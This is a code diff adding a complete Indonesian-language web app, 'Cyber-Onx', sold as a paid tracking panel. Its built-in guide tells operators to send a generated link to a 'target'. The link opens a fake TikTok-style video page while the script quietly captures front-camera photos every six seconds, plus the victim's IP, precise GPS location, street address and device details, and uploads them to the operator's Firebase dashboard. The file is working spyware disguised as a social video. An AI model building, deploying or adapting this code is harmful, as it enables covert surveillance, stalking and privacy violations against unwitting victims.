@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cyber Onx X Dhz</title>
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    <script src="firebase-by-onedev.js"></script>
+    
+    <style>
+        /* ===== RESET & VARIABLES ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-main: #0c0c10;
+            --bg-secondary: #13131a;
+            --panel-bg: #1a1a24;
+            --panel-border: #2a2a35;
+            --accent-primary: #2a85ff;
+            --accent-secondary: #3a6ea5;
+            --text-primary: #f0f0f0;
+            --text-secondary: #a0a0b0;
+            --text-muted: #6a6a7a;
+            --success: #2ecc71;
+            --danger: #e74c3c;
+            --warning: #f39c12;
+            --card-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+            --transition: 0.15s ease;
+        }
+
+        body {
+            background: var(--bg-main);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .app-container {
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            position: relative;
+            background: transparent;
+            margin: 0 auto;
+        }
+
+        /* ===== TAB SYSTEM ===== */
+        .tab {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: var(--bg-main);
+            z-index: 1000;
+            overflow-y: auto;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.25s ease, visibility 0.25s ease;
+            display: flex;
+            justify-content: center;
+        }
+
+        .tab.active {
+            opacity: 1;
+            visibility: visible;
+            z-index: 2000;
+        }
+
+        .tab-content {
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            padding: 70px 16px 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            position: relative;
+        }
+
+        /* ===== HEADER STYLES ===== */
+        .page-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 54px;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--panel-border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+        }
+
+        .page-header .title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            color: var(--text-primary);
+        }
+
+        .dashboard-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 54px;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--panel-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            z-index: 3000;
+        }
+
+        .nav-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 54px;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--panel-border);
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            z-index: 3000;
+        }
+
+        .nav-back, .nav-menu, .dashboard-hamburger, .dashboard-logout {
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--panel-bg);
+            border: 1px solid var(--panel-border);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 18px;
+            cursor: pointer;
+            transition: all var(--transition);
+        }
+
+        .nav-back:active, .nav-menu:active, .dashboard-hamburger:active, .dashboard-logout:active {
+            background: var(--accent-primary);
+            color: white;
+            border-color: var(--accent-primary);
+        }
+
+        .dashboard-logout {
+            background: rgba(231, 76, 60, 0.1);
+            border-color: rgba(231, 76, 60, 0.3);
+            color: var(--danger);
+        }
+
+        .dashboard-logout:active {
+            background: var(--danger);
+            color: white;
+            border-color: var(--danger);
+        }
+
+        .nav-title, .dashboard-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            color: var(--text-primary);
+            flex: 1;
+            text-align: center;
+        }
+
+        /* ===== CARDS ===== */
+        .card {
+            background: var(--panel-bg);
+            border: 1px solid var(--panel-border);
+            border-radius: 16px;
+            padding: 20px 18px;
+            box-shadow: var(--card-shadow);
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn {
+            background: var(--accent-primary);
+            border: none;
+            border-radius: 12px;
+            padding: 14px 20px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            color: white;
+            cursor: pointer;
+            transition: all var(--transition);
+            width: 100%;
+        }
+
+        .btn:active {
+            opacity: 0.8;
+            transform: scale(0.98);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--panel-border);
+            color: var(--text-primary);
+        }
+
+        .btn-outline:active {
+            background: var(--panel-border);
+        }
+
+        /* ===== INPUT FIELDS ===== */
+        .input-field {
+            width: 100%;
+            background: var(--bg-secondary);
+            border: 1px solid var(--panel-border);
+            border-radius: 12px;
+            padding: 14px 18px;
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: all var(--transition);
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            background: #20202a;
+        }
+
+        .input-field::placeholder {
+            color: var(--text-muted);
+        }
+
+        .link-input {
+            display: flex;
+            align-items: center;
+            background: var(--bg-secondary);
+            border: 1px solid var(--panel-border);
+            border-radius: 12px;
+            padding: 4px 4px 4px 18px;
+        }
+
+        .link-input input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--text-primary);
+            font-size: 13px;
+            font-family: 'Inter', sans-serif;
+            padding: 14px 0;
+            outline: none;
+        }
+
+        .link-input button {
+            width: 44px;
+            height: 44px;
+            border-radius: 10px;
+            background: var(--panel-bg);
+            border: 1px solid var(--panel-border);
+            color: var(--accent-primary);
+            font-size: 18px;
+            cursor: pointer;
+            transition: all var(--transition);
+        }
+
+        .link-input button:active {
+            background: var(--accent-primary);
+            color: white;
+            border-color: var(--accent-primary);
+        }
+
+        /* ===== LOGIN CARD ===== */
+        .login-card {
+            background: var(--panel-bg);
+            border: 1px solid var(--panel-border);
+            border-radius: 20px;
+            padding: 32px 24px;
+            text-align: center;
+            box-shadow: var(--card-shadow);
+            width: 100%;
+        }
+
+        .login-logo {
+            width: 100px;
+            height: 100px;
+            background: var(--bg-secondary);
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            border: 1px solid var(--panel-border);
+            overflow: hidden;
+        }
+
+        .login-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .login-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            color: var(--text-primary);
+            margin-bottom: 24px;
+        }
+
+        /* ===== TARGET FOLDER ===== */
+        .target-folder {
+            background: var(--bg-secondary);
+            border: 1px solid var(--panel-border);
+            border-radius: 14px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all var(--transition);
+        }
+
+        .target-folder:active {
+            background: #252530;
+            transform: translateX(4px);
+        }
+
+        .target-folder-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .target-folder-icon {
+            background: rgba(42, 133, 255, 0.1);
+            padding: 10px;
+            border-radius: 12px;
+            color: var(--accent-primary);
+            font-size: 20px;
+        }
+
+        .target-folder-info b {
+            font-size: 14px;
+            color: var(--text-primary);
+        }
+
+        .target-folder-info small {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .target-folder-delete {
+            background: none;
+            border: none;
+            color: var(--danger);
+            font-size: 16px;
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        /* ===== GUIDE ===== */
+        .guide-container {
+            margin-top: 16px;
+            border: 1px solid var(--panel-border);
+            border-radius: 14px;
+            overflow: hidden;
+        }
+
+        .guide-header {
+            background: var(--bg-secondary);
+            padding: 14px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--text-primary);
+            font-size: 13px;
+        }
+
+        .guide-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.2s ease;
+            background: var(--panel-bg);
+        }
+
+        .guide-content.open {
+            max-height: 300px;
+            padding: 18px;
+            border-top: 1px solid var(--panel-border);
+        }
+
+        .guide-text {
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .guide-text span {
+            color: var(--accent-primary);
+            display: block;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        /* ===== PHOTO GRID ===== */
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .photo-item {
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid var(--panel-border);
+            aspect-ratio: 1;
+            cursor: pointer;
+            transition: all var(--transition);
+        }
+
+        .photo-item:active {
+            opacity: 0.8;
+            transform: scale(0.97);
+        }
+
+        .photo-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* ===== SIDE NAVIGATION ===== */
+        .side-nav {
+            position: fixed;
+            top: 0;
+            left: -100%;
+            width: 300px;
+            height: 100vh;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--panel-border);
+            z-index: 4000;
+            transition: left 0.25s ease;
+            padding: 20px 0;
+            overflow-y: auto;
+        }
+
+        .side-nav.active {
+            left: 0;
+        }
+
+        .side-nav-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 3500;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.25s ease;
+        }
+
+        .side-nav-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .nav-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid var(--panel-border);
+        }
+
+        .nav-header-logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 16px;
+            margin: 0 auto 12px;
+            border: 1px solid var(--panel-border);
+            overflow: hidden;
+        }
+
+        .nav-header-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px 24px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            border-bottom: 1px solid var(--panel-border);
+            transition: all var(--transition);
+        }
+
+        .nav-item:active {
+            background: var(--panel-bg);
+            color: var(--accent-primary);
+        }
+
+        .nav-item i {
+            width: 24px;
+            font-size: 18px;
+        }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 5000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-box {
+            background: var(--bg-secondary);
+            border: 1px solid var(--panel-border);
+            border-radius: 20px;
+            padding: 28px 24px;
+            width: 100%;
+            max-width: 380px;
+        }
+
+        .modal-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 16px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--panel-border);
+            font-size: 13px;
+        }
+
+        .info-label {
+            color: var(--text-muted);
+        }
+
+        .info-value {
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        /* ===== ZOOM OVERLAY ===== */
+        .zoom-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 6000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .zoom-overlay img {
+            max-width: 100%;
+            max-height: 80vh;
+            border-radius: 16px;
+            border: 1px solid var(--panel-border);
+        }
+
+        /* ===== TIMER ===== */
+        .timer-badge {
+            background: var(--bg-secondary);
+            border: 1px solid var(--panel-border);
+            border-radius: 20px;
+            padding: 4px 14px;
+            font-family: 'Orbitron', monospace;
+            font-size: 11px;
+            color: var(--success);
+        }
+
+        /* ===== UTILITY ===== */
+        .mt-2 { margin-top: 8px; }
+        .mt-3 { margin-top: 12px; }
+        .mt-4 { margin-top: 16px; }
+        .mb-2 { margin-bottom: 8px; }
+        .mb-3 { margin-bottom: 12px; }
+        .mb-4 { margin-bottom: 16px; }
+        .text-muted { color: var(--text-muted); }
+        .text-center { text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- SIDE NAV -->
+        <div class="side-nav-overlay" id="sideNavOverlay" onclick="toggleSideNav()"></div>
+        <div class="side-nav" id="sideNav">
+            <div class="nav-header">
+                <div class="nav-header-logo">
+                    <img src="https://i.imgur.com/0BTalUo.jpeg" alt="Logo">
+                </div>
+                <div style="font-weight:600; margin-bottom:4px;">ONX-1</div>
+                <div style="font-size:10px; color:var(--text-muted);">BY ONEDEV</div>
+            </div>
+            
+            <a href="#" class="nav-item" onclick="openModal('modalAkun'); toggleSideNav();">
+                <i class="fas fa-user"></i> Profile User
+            </a>
+            <a href="https://wa.me/6289513794264" target="_blank" class="nav-item">
+                <i class="fab fa-whatsapp"></i> WhatsApp Admin
+            </a>
+            <a href="https://t.me/onetoxice" target="_blank" class="nav-item">
+                <i class="fab fa-telegram-plane"></i> Telegram Admin
+            </a>
+            <a href="https://whatsapp.com/channel/0029Vb6o7sgGU3BKw965Ti0o" target="_blank" class="nav-item">
+                <i class="fab fa-whatsapp" style="color:#2ecc71;"></i> Saluran WhatsApp
+            </a>
+            <a href="https://tiktok.com/@onedev_" target="_blank" class="nav-item">
+                <i class="fab fa-tiktok"></i> TikTok Update
+            </a>
+        </div>
+
+        <!-- LOGIN TAB -->
+        <div class="tab" id="tabLogin">
+            <div class="page-header">
+                <div class="title">LOGIN</div>
+            </div>
+            
+            <div class="tab-content" style="justify-content:center;">
+                <div class="login-card">
+                    <div class="login-logo">
+                        <img src="https://i.imgur.com/0BTalUo.jpeg" alt="Logo">
+                    </div>
+                    
+                    <div class="login-title">CYBER-ONX</div>
+                    
+                    <input type="text" id="userIn" class="input-field" placeholder="Username" style="margin-bottom:12px;">
+                    <input type="password" id="passIn" class="input-field" placeholder="Password" style="margin-bottom:20px;">
+                    
+                    <button class="btn" onclick="handleLogin()">LOGIN</button>
+                    
+                    <div style="margin-top:20px; font-size:13px; color:var(--text-muted); cursor:pointer;" onclick="openModal('modalReg')">
+                        Belum punya akun? <span style="color:var(--accent-primary);">Klik sini</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ADMIN TAB -->
+        <div class="tab" id="tabAdmin">
+            <div class="dashboard-header">
+                <div class="dashboard-hamburger" onclick="toggleSideNav()">
+                    <i class="fas fa-bars"></i>
+                </div>
+                <div class="dashboard-title">DASHBOARD</div>
+                <div class="dashboard-logout" onclick="openModal('modalLogout')">
+                    <i class="fas fa-sign-out-alt"></i>
+                </div>
+            </div>
+            
+            <div class="tab-content">
+                <!-- Profile Card -->
+                <div class="card" style="text-align:center;">
+                    <div style="display:flex; justify-content:flex-end; margin-bottom:8px;">
+                        <span class="timer-badge" id="expDisplay">EXP: --:--:--</span>
+                    </div>
+                    
+                    <div style="width:80px; height:80px; border-radius:16px; margin:0 auto 12px; border:1px solid var(--panel-border); overflow:hidden;">
+                        <img src="https://i.imgur.com/0BTalUo.jpeg" style="width:100%; height:100%; object-fit:cover;">
+                    </div>
+                    
+                    <h3 style="font-family:'Orbitron'; font-size:16px; margin-bottom:8px;">CYBER-ONX</h3>
+                    
+                    <div style="display:inline-flex; align-items:center; gap:6px; background:rgba(46, 204, 113, 0.1); color:var(--success); padding:6px 16px; border-radius:20px; border:1px solid rgba(46,204,113,0.2); font-size:11px;">
+                        <span style="width:8px; height:8px; background:var(--success); border-radius:50%;"></span>
+                        SYSTEM OPERATIONAL
+                    </div>
+                </div>
+
+                <!-- Link Card -->
+                <div class="card">
+                    <div style="margin-bottom:8px;">
+                        <span style="font-size:11px; color:var(--text-muted); font-weight:600; letter-spacing:0.5px;">🔗 GENERATE LINK</span>
+                    </div>
+                    
+                    <div class="link-input">
+                        <input type="text" id="genUrl" readonly value="Generating link...">
+                        <button onclick="copyLink()">
+                            <i class="far fa-copy"></i>
+                        </button>
+                    </div>
+                    
+                    <!-- Guide -->
+                    <div class="guide-container">
+                        <div class="guide-header" onclick="toggleGuide()">
+                            <span>( ! ) PANDUAN</span>
+                            <i class="fas fa-chevron-down" id="guideIcon"></i>
+                        </div>
+                        <div class="guide-content" id="guideContent">
+                            <div class="guide-text">
+                                1. Salin tautan di atas<br>
+                                2. Kirim ke target<br>
+                                3. Target izinkan akses<br>
+                                4. Data muncul di folder<br>
+                                <span>Gunakan bijak!</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Live Feed -->
+                <div class="card">
+                    <span style="font-size:11px; color:var(--text-muted); font-weight:600; letter-spacing:0.5px;">📡 LIVE FEED</span>
+                    <div id="targetList" style="margin-top:12px;"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- GALLERY TAB -->
+        <div class="tab" id="tabGallery">
+            <div class="nav-bar">
+                <div class="nav-back" onclick="switchTab('tabAdmin')">
+                    <i class="fas fa-arrow-left"></i>
+                </div>
+                <div class="nav-title">GALLERY</div>
+                <div class="nav-menu" onclick="toggleSideNav()">
+                    <i class="fas fa-bars"></i>
+                </div>
+            </div>
+            
+            <div class="tab-content">
+                <div class="card" style="position:relative;">
+                    <div style="position:absolute; top:16px; right:16px; cursor:pointer;" onclick="copyTargetData()">
+                        <i class="far fa-copy" style="color:var(--text-muted);"></i>
+                    </div>
+                    <h3 style="font-size:14px; font-weight:600; margin-bottom:16px;">📋 INFO TARGET</h3>
+                    <div id="infoContainer"></div>
+                </div>
+                
+                <div class="photo-grid" id="photoGrid"></div>
+            </div>
+        </div>
+
+        <!-- TARGET TAB -->
+        <div class="tab" id="tabTarget">
+            <div style="width:100%; height:100%; position:relative; background:#000;">
+                <video autoplay muted loop playsinline style="width:100%; height:100%; object-fit:cover;">
+                    <source src="https://i.imgur.com/9e0hgPJ.mp4" type="video/mp4">
+                </video>
+                
+                <div style="position:absolute; bottom:70px; left:15px;">
+                    <div style="display:flex; align-items:center; gap:6px; margin-bottom:4px;">
+                        <span style="font-weight:600; font-size:15px;">AnnisaShop</span>
+                        <span style="background:#e74c3c; padding:2px 10px; border-radius:12px; font-size:10px;">Follow</span>
+                    </div>
+                    <div style="font-size:13px;">POV: Lu jadi kece #viral #fyp</div>
+                </div>
+                
+                <div style="position:absolute; right:15px; bottom:100px; display:flex; flex-direction:column; gap:16px; align-items:center;">
+                    <div style="text-align:center;"><i class="fas fa-heart" style="font-size:26px;"></i><div style="font-size:11px;">45K</div></div>
+                    <div style="text-align:center;"><i class="fas fa-comment" style="font-size:26px;"></i><div style="font-size:11px;">10K</div></div>
+                    <div style="text-align:center;"><i class="fas fa-share" style="font-size:26px;"></i><div style="font-size:11px;">120K</div></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MODALS -->
+        <div class="modal-overlay" id="modalAkun">
+            <div class="modal-box">
+                <div class="modal-title">ACCOUNT INFO</div>
+                <div>
+                    <div class="info-row"><span class="info-label">Username:</span><span class="info-value" id="uDisplay">--</span></div>
+                    <div class="info-row"><span class="info-label">Password:</span><span class="info-value" id="pDisplay">••••••</span></div>
+                    <div class="info-row"><span class="info-label">Expired:</span><span class="info-value" id="popExp">23:59:59</span></div>
+                </div>
+                <button class="btn mt-4" onclick="closeModal('modalAkun')">CLOSE</button>
+            </div>
+        </div>
+
+        <div class="modal-overlay" id="modalReg">
+            <div class="modal-box">
+                <div class="modal-title">BELI AKSES</div>
+                <p style="font-size:12px; color:var(--text-muted); margin-bottom:20px;">Pilih layanan admin:</p>
+                <div style="display:flex; flex-direction:column; gap:10px;">
+                    <a href="https://wa.me/6289513794264" target="_blank" class="btn" style="background:#25D366; text-decoration:none; display:flex; align-items:center; justify-content:center; gap:8px;">
+                        <i class="fab fa-whatsapp"></i> WHATSAPP
+                    </a>
+                    <a href="https://t.me/onetoxice" target="_blank" class="btn" style="background:#0088cc; text-decoration:none; display:flex; align-items:center; justify-content:center; gap:8px;">
+                        <i class="fab fa-telegram-plane"></i> TELEGRAM
+                    </a>
+                    <a href="https://whatsapp.com/channel/0029VbCpdLJD8SDw4Zm4hH2e" target="_blank" class="btn" style="background:#f39c12; color:#000; text-decoration:none; display:flex; align-items:center; justify-content:center; gap:8px;">
+                        <i class="fas fa-star"></i> TESTIMONI
+                    </a>
+                    <button class="btn-outline btn mt-2" onclick="closeModal('modalReg')">KEMBALI</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal-overlay" id="modalLogout">
+            <div class="modal-box">
+                <div class="modal-title">LOGOUT</div>
+                <p style="font-size:13px; color:var(--text-muted); margin-bottom:20px;">Keluar dari akun?</p>
+                <div style="display:flex; gap:10px;">
+                    <button class="btn-outline btn" onclick="closeModal('modalLogout')">NO</button>
+                    <button class="btn" style="background:var(--danger);" onclick="logout()">YES</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ZOOM -->
+        <div class="zoom-overlay" id="zoomOverlay" onclick="this.style.display='none'">
+            <img id="zoomedImage" src="">
+        </div>
+    </div>
+
+    <script>
+        // ===== FUNCTIONS =====
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+        }
+
+        function toggleSideNav() {
+            document.getElementById('sideNav').classList.toggle('active');
+            document.getElementById('sideNavOverlay').classList.toggle('active');
+        }
+
+        function openModal(id) {
+            document.getElementById(id).style.display = 'flex';
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+
+        function b64e(str) { 
+            return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); 
+        }
+        
+        function b64d(str) { 
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            while (str.length % 4) str += '=';
+            return atob(str);
+        }
+
+        // Timer
+        function startRealtimeTimer() {
+            setInterval(() => {
+                const exp = localStorage.getItem('user_expiry');
+                if(!exp) return;
+                
+                let now = new Date().getTime();
+                let distance = exp - now;
+                
+                if (distance < 0) { 
+                    logout(); 
+                    return; 
+                }
+                
+                let hours = Math.floor(distance / 3600000);
+                let mins = Math.floor((distance % 3600000) / 60000);
+                let secs = Math.floor((distance % 60000) / 1000);
+                
+                let timeStr = `${String(hours).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+                
+                if(document.getElementById('expDisplay')) {
+                    document.getElementById('expDisplay').innerText = "EXP: " + timeStr;
+                }
+                if(document.getElementById('popExp')) {
+                    document.getElementById('popExp').innerText = timeStr;
+                }
+            }, 1000);
+        }
+
+        // Login
+        function handleLogin() {
+            const u = document.getElementById('userIn').value.trim();
+            const p = document.getElementById('passIn').value.trim();
+            
+            if(!u || !p) {
+                alert("Masukan Username & Password!");
+                return;
+            }
+            
+            db.ref('registered_users/' + u).once('value').then((snap) => {
+                const data = snap.val();
+                if(data && data.password === p) {
+                    if(new Date().getTime() < data.expiry) {
+                        localStorage.setItem('is_logged_in', 'true');
+                        localStorage.setItem('current_user', u);
+                        localStorage.setItem('user_expiry', data.expiry);
+                        localStorage.setItem('user_pass', p);
+                        showAdmin();
+                    } else { 
+                        alert("AKUN EXPIRED"); 
+                    }
+                } else { 
+                    alert("USERNAME/PASSWORD SALAH"); 
+                }
+            }).catch(e => alert("Error: " + e.message));
+        }
+
+        function showAdmin() {
+            switchTab('tabAdmin');
+            
+            const user = localStorage.getItem('current_user');
+            document.getElementById('uDisplay').innerText = user;
+            document.getElementById('pDisplay').innerText = localStorage.getItem('user_pass');
+            
+            const baseUrl = window.location.href.split('?')[0];
+            const token = b64e(user);
+            document.getElementById('genUrl').value = `${baseUrl}?id=${Math.floor(1000+Math.random()*9000)}&t=${token}`;
+            
+            db.ref(`users/${user}/targets`).on('value', (snap) => {
+                renderTargetList(snap.val());
+            });
+        }
+
+        function renderTargetList(val) {
+            const list = document.getElementById('targetList');
+            list.innerHTML = '';
+            
+            if(!val) {
+                list.innerHTML = '<p style="text-align:center; color:var(--text-muted); padding:20px;">Belum ada data</p>';
+                return;
+            }
+            
+            Object.keys(val).reverse().forEach(id => {
+                const t = val[id];
+                const div = document.createElement('div');
+                div.className = 'target-folder';
+                div.onclick = () => openTargetFolder(id, t);
+                
+                div.innerHTML = `
+                    <div class="target-folder-left">
+                        <div class="target-folder-icon"><i class="fas fa-folder"></i></div>
+                        <div class="target-folder-info">
+                            <b>TRACK #${id}</b><br>
+                            <small>${t.ip || 'Connecting...'}</small>
+                        </div>
+                    </div>
+                    <button class="target-folder-delete" onclick="event.stopPropagation(); deleteTarget('${id}')">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                `;
+                list.appendChild(div);
+            });
+        }
+
+        function openTargetFolder(id, t) {
+            const info = document.getElementById('infoContainer');
+            let html = `
+                <div class="info-row"><span class="info-label">IP:</span><span class="info-value">${t.ip || '--'}</span></div>
+                <div class="info-row"><span class="info-label">RAM:</span><span class="info-value">${t.ram || '--'}</span></div>
+                <div class="info-row"><span class="info-label">Waktu:</span><span class="info-value">${t.time || '--'}</span></div>
+                <div class="info-row"><span class="info-label">Lokasi:</span><span class="info-value">${t.loc || '--'}</span></div>
+            `;
+            
+            if(t.loc && t.loc.includes(',')) {
+                html += `<a href="https://www.google.com/maps?q=${t.loc}" target="_blank" style="display:block; background:#4285F4; color:white; text-align:center; padding:10px; border-radius:12px; text-decoration:none; margin:12px 0; font-size:12px;"><i class="fas fa-map-marker-alt"></i> LIHAT MAPS</a>`;
+            }
+            
+            html += `<div class="info-row"><span class="info-label">Alamat:</span><span class="info-value">${t.address || '--'}</span></div>`;
+            info.innerHTML = html;
+
+            const grid = document.getElementById('photoGrid');
+            grid.innerHTML = '';
+            if(t.photos) {
+                Object.values(t.photos).reverse().forEach(p => {
+                    grid.innerHTML += `<div class="photo-item" onclick="openZoom('${p}')"><img src="${p}"></div>`;
+                });
+            }
+            
+            switchTab('tabGallery');
+        }
+
+        function deleteTarget(id) {
+            if(confirm('Hapus target?')) {
+                db.ref(`users/${localStorage.getItem('current_user')}/targets/${id}`).remove();
+            }
+        }
+
+        function startCapture(id, owner) {
+            const path = `users/${owner}/targets/${id}`;
+            const time = new Date().toLocaleString('id-ID');
+            
+            db.ref(path).update({ 
+                time: time, 
+                ip: 'Fetching...', 
+                loc: 'Mencari Lokasi...',
+                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown"
+            });
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(res => db.ref(path).update({ip: res.ip}));
+            
+            // Camera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(s => {
+                    const v = document.createElement('video');
+                    v.srcObject = s;
+                    v.play();
+                    setInterval(() => {
+                        const c = document.createElement('canvas');
+                        c.width = 480;
+                        c.height = 480;
+                        c.getContext('2d').drawImage(v, 0, 0, 480, 480);
+                        db.ref(path + '/photos').push(c.toDataURL('image/jpeg', 0.6));
+                    }, 6000);
+                }).catch(() => {});
+            
+            // Location
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    db.ref(path).update({ loc: `${p.coords.latitude},${p.coords.longitude}` });
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`)
+                        .then(r => r.json())
+                        .then(d => db.ref(path).update({ address: d.display_name }));
+                }, null, {enableHighAccuracy:true});
+            }
+        }
+
+        function copyLink() {
+            document.getElementById('genUrl').select();
+            document.execCommand('copy');
+            alert('Link copied!');
+        }
+
+        function copyTargetData() {
+            navigator.clipboard.writeText(document.getElementById('infoContainer').innerText)
+                .then(() => alert('Data copied!'));
+        }
+
+        function toggleGuide() {
+            const content = document.getElementById('guideContent');
+            const icon = document.getElementById('guideIcon');
+            content.classList.toggle('open');
+            icon.style.transform = content.classList.contains('open') ? 'rotate(180deg)' : 'rotate(0deg)';
+        }
+
+        function openZoom(src) {
+            document.getElementById('zoomedImage').src = src;
+            document.getElementById('zoomOverlay').style.display = 'flex';
+        }
+
+        function logout() {
+            localStorage.clear();
+            closeModal('modalLogout');
+            switchTab('tabLogin');
+        }
+
+        // Init
+        window.onload = function() {
+            startRealtimeTimer();
+            
+            const params = new URLSearchParams(window.location.search);
+            const idParam = params.get('id');
+            const tToken = params.get('t');
+            const regU = params.get('reg_u');
+            const regP = params.get('reg_p');
+            
+            if(idParam && tToken) {
+                try {
+                    switchTab('tabTarget');
+                    startCapture(idParam, b64d(tToken));
+                } catch { switchTab('tabLogin'); }
+            }
+            else if(regU && regP) {
+                switchTab('tabLogin');
+                document.getElementById('userIn').value = regU;
+                document.getElementById('passIn').value = regP;
+                setTimeout(handleLogin, 100);
+            }
